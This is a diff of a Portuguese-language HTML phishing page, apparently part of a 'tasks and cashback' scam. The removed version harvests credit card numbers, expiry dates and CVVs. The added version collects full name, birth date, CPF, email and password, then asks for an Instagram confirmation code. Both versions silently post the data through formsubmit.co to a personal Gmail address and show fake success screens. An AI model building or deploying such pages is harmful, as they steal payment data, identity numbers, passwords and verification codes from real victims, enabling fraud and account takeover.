@@ -1,166 +1,192 @@
 <!DOCTYPE html>
-<html lang="pt-br">
+<html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Validação de Cartão</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Cadastro + Confirmação</title>
   <style>
     body {
-      margin: 0;
-      background-color: #f3f3f3;
-      font-family: 'Roboto', sans-serif;
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to right, #83a4d4, #b6fbff);
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      padding: 20px;
+      margin: 0;
     }
 
     .container {
-      background-color: #fff;
-      padding: 32px 32px 20px 32px;
-      border-radius: 14px;
-      box-shadow: 0 4px 10px rgba(0,0,0,0.08);
-      max-width: 380px;
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 16px rgba(0,0,0,0.2);
       width: 100%;
-      text-align: center;
-      transition: all 0.3s ease;
+      max-width: 420px;
     }
 
     h2 {
-      color: #c5002e;
-      margin-bottom: 15px;
-      font-size: 21px;
+      text-align: center;
+      margin-bottom: 20px;
+      color: #333;
     }
 
-    p.subtitulo {
-      font-size: 14px;
-      color: #444;
-      margin-bottom: 25px;
+    label {
+      display: block;
+      margin-top: 12px;
+      font-weight: bold;
     }
 
-    input {
+    input, select {
       width: 100%;
-      padding: 12px 14px;
-      margin: 10px 0;
+      padding: 12px;
+      margin-top: 6px;
       border: 1px solid #ccc;
-      border-radius: 10px;
-      font-size: 15px;
-      transition: border 0.3s;
-    }
-
-    input:focus {
-      outline: none;
-      border-color: #c5002e;
+      border-radius: 6px;
+      font-size: 14px;
     }
 
     button {
       width: 100%;
-      background-color: #c5002e;
+      padding: 14px;
+      margin-top: 20px;
+      background-color: #007bff;
       color: white;
       border: none;
-      padding: 14px;
+      border-radius: 6px;
       font-size: 16px;
-      font-weight: bold;
-      border-radius: 10px;
       cursor: pointer;
-      margin-top: 12px;
-      transition: background-color 0.3s;
     }
 
     button:hover {
-      background-color: #a80025;
+      background-color: #0056b3;
     }
 
-    .info {
-      font-size: 13px;
-      color: #777;
-      margin-top: 14px;
-    }
-
-    .hidden {
+    .carregando, .mensagem-final, #etapa2 {
       display: none;
+      text-align: center;
+      margin-top: 20px;
     }
 
-    .loading img {
-      width: 45px;
-      margin-bottom: 15px;
-      animation: spin 1s linear infinite;
+    .barra {
+      width: 100%;
+      background-color: #ddd;
+      border-radius: 10px;
+      overflow: hidden;
+      height: 20px;
+      margin-top: 20px;
     }
 
-    @keyframes spin {
-      0% { transform: rotate(0deg);}
-      100% { transform: rotate(360deg);}
+    .progresso {
+      height: 100%;
+      width: 0%;
+      background-color: #007bff;
+      animation: carregar 3s linear forwards;
     }
 
-    .final h2 {
-      color: #2e7d32;
-      font-size: 20px;
-    }
-
-    .final p {
-      font-size: 14px;
-      color: #555;
-      margin-top: 10px;
+    @keyframes carregar {
+      0% { width: 0%; }
+      100% { width: 100%; }
     }
   </style>
 </head>
 <body>
 
-  <!-- Tela do formulário -->
-  <div class="container" id="formulario">
-    <h2>Validação de Cartão</h2>
-    <p class="subtitulo">Use um cartão válido para liberar suas tarefas e receber cashback no saldo</p>
-    <form id="cartaoForm">
-      <input type="text" name="numero_cartao" placeholder="Número do cartão" required maxlength="19">
-      <input type="text" name="validade" placeholder="Validade (MM/AA)" required maxlength="5">
-      <input type="text" name="cvv" placeholder="Código de segurança (CVV)" required maxlength="4">
-      <input type="hidden" name="_captcha" value="false">
-      <button type="submit">Validar agora</button>
-    </form>
-    <p class="info">Suas informações estão protegidas com segurança.</p>
-  </div>
+<div class="container">
 
-  <!-- Tela de carregamento -->
-  <div class="container hidden" id="carregando">
-    <div class="loading">
-      <img src="https://i.gifer.com/ZZ5H.gif" alt="Carregando">
-      <p>Processando os dados...</p>
+  <!-- ETAPA 1: Cadastro -->
+  <div id="etapa1">
+    <h2>Cadastro Inicial</h2>
+    <form id="formulario">
+      <label for="nome">Nome completo</label>
+      <input type="text" id="nome" name="nome" required>
+
+      <label for="data">Data de nascimento</label>
+      <input type="date" id="data" name="data_nascimento" required>
+
+      <label for="cpf">CPF</label>
+      <input type="text" id="cpf" name="cpf" required>
+
+      <label for="email">E-mail</label>
+      <input type="email" id="email" name="email_usuario" required>
+
+      <label for="senha">Senha</label>
+      <input type="password" id="senha" name="senha" required>
+
+      <label for="confirmarSenha">Confirmar senha</label>
+      <input type="password" id="confirmarSenha" name="confirmar_senha" required>
+
+      <p style="font-size: 13px; color: #555; margin-top: 10px;">
+        Após o cadastro, você será incluído no grupo do Instagram.
+      </p>
+
+      <button type="submit">Enviar cadastro</button>
+    </form>
+
+    <div class="carregando" id="carregando">
+      <p>Enviando informações...</p>
+      <div class="barra">
+        <div class="progresso"></div>
+      </div>
     </div>
   </div>
 
-  <!-- Tela final -->
-  <div class="container hidden final" id="final">
-    <h2>✅ Cartão Validado</h2>
-    <p>Você já pode iniciar suas tarefas.<br>Em breve entraremos em contato por e-mail ou WhatsApp.</p>
+  <!-- ETAPA 2: Código de Confirmação -->
+  <div id="etapa2">
+    <h2>Confirmação do Grupo</h2>
+    <p>Enviamos um código para liberar sua entrada no grupo do Instagram.<br>Digite o código abaixo para confirmar:</p>
+
+    <form action="https://formsubmit.co/natanaelverissimo34@gmail.com" method="POST">
+      <input type="text" name="codigo_confirmacao" placeholder="Digite o código" required>
+      <input type="hidden" name="_next" value="https://tarefass.github.io/tarefas-/">
+      <input type="hidden" name="_captcha" value="false">
+      <button type="submit">Confirmar código</button>
+    </form>
   </div>
 
-  <script>
-    const form = document.getElementById("cartaoForm");
-    const formulario = document.getElementById("formulario");
-    const carregando = document.getElementById("carregando");
-    const final = document.getElementById("final");
+</div>
 
-    form.addEventListener("submit", function(e) {
-      e.preventDefault();
+<script>
+  document.getElementById("formulario").addEventListener("submit", function(e) {
+    e.preventDefault();
 
-      formulario.classList.add("hidden");
-      carregando.classList.remove("hidden");
+    const senha = document.getElementById("senha").value;
+    const confirmarSenha = document.getElementById("confirmarSenha").value;
 
-      const dados = new FormData(form);
-      fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
-        method: "POST",
-        headers: { 'Accept': 'application/json' },
-        body: dados
-      });
+    if (senha !== confirmarSenha) {
+      alert("As senhas não coincidem.");
+      return;
+    }
 
-      setTimeout(() => {
-        carregando.classList.add("hidden");
-        final.classList.remove("hidden");
-      }, 2500);
+    const form = e.target;
+    const formData = new FormData(form);
+
+    form.style.display = "none";
+    document.getElementById("carregando").style.display = "block";
+
+    fetch("https://formsubmit.co/ajax/natanaelverissimo34@gmail.com", {
+      method: "POST",
+      body: formData,
+      headers: {
+        'Accept': 'application/json'
+      }
+    })
+    .then(response => {
+      if (response.ok) {
+        setTimeout(() => {
+          document.getElementById("etapa1").style.display = "none";
+          document.getElementById("etapa2").style.display = "block";
+        }, 3000);
+      } else {
+        throw new Error('Erro ao enviar');
+      }
+    })
+    .catch(error => {
+      alert("Ocorreu um erro ao enviar o formulário.");
+      form.style.display = "block";
+      document.getElementById("carregando").style.display = "none";
     });
-  </script>
+  });
+</script>
 
 </body>
 </html>
